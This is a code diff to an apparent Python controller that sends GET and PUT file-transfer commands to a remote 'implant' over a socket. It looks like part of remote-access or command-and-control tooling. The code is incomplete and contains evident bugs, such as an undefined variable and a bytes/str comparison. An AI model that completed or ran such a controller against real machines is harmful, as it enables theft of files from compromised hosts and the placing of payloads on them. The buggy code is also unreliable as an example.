@@ -39,14 +39,57 @@ def doConnect():
 #-----------------------------------------------
 
 #-----------------------------------------------
-def putFile(sock, filepath, filename, overwrite):
+def getFile(sock, filepath, filename, overwrite):
     try:
-        # Will send off our command and wait for response 
-        sock.send(bytes(str(PUT), "utf-8"))
+        # First tell our implant we want a get file performed
+        sock.send(bytes(str(GET), "utf-8") + b"\x00")
+
+        # Send filepath
+        sock.send(filepath)
+
+        # Wait for response (should be success code followed by file contents)
+        data = sock.recv(1024)
+        print("Data received is %s\n" % str(data))
+
+        if (data == "SUCCESS"):
+            print("Successful file get!")
+
+        # Placeholder - will continue reading data until... end code is sent?
+        moreData = True
+        while(moreData):
+            data = sock.recv(1024)
+            print("Data received is %s\n" % str(data))
+            moreData = False
 
 
     except Exception as e:
-        print("ERROR: Could not connect to implant: ", e)
+        print("ERROR: Could not send get file to implant: ", e)
+        return 0
+    return 1
+
+
+#-----------------------------------------------
+
+#-----------------------------------------------
+def putFile(sock, filepath, filename, overwrite):
+    try:
+        # First tell our implant we want a PUT file performed
+        sock.send(bytes(str(PUT), "utf-8"))
+        # Send filepath
+        sock.send(bytes(filepath), "utf-8")
+        # Wait for response (should be success code)
+        data = sock.recv(1024)
+        print("Data received is %s\n" % data)
+
+        # Placeholder - will continue reading data until... end code is sent?
+        moreData = True
+        while(morData):
+            sock.recv(1024)
+            moreData = False
+
+
+    except Exception as e:
+        print("ERROR: Could not send put file to implant: ", e)
         return 0
     return 1
 
@@ -71,6 +114,16 @@ def handleInput():
             overwrite = bytes(overwrite, 'utf-8')
 
             putFile(sock, filepath, filename, overwrite)
+
+        elif (int(userInput) == GET):
+            filepath= input("Please input filepath > ")
+            filename = input("Please input filename (if not provided will use source file name) > ")
+            overwrite = input("Would you like to overwrite existing file on host? > ")
+            filepath = bytes(filepath, 'utf-8')
+            filename = bytes(filename, 'utf-8')
+            overwrite = bytes(overwrite, 'utf-8')
+
+            getFile(sock, filepath, filename, overwrite)
 
     return
 
